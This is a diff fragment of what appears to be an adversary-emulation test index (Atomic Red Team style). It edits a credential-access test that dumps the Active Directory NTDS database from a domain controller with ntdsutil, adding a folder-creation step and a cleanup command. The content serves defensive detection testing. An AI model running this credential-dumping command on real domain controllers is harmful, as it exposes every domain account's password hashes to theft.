@@ -18235,7 +18235,7 @@ credential-access:
         output_folder:
           description: Path where resulting dump should be placed
           type: Path
-          default: C:\Windows\Temp
+          default: C:\Windows\Temp\ntds_T1003
       dependencies:
       - description: Target must be a Domain Controller
         prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
@@ -18243,7 +18243,10 @@ credential-access:
         get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
           must be done manually
       executor:
-        command: 'ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+        command: |
+          mkdir #{output_folder}
+          ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+        cleanup_command: 'rmdir /q /s #{output_folder}
 
 '
         name: command_prompt
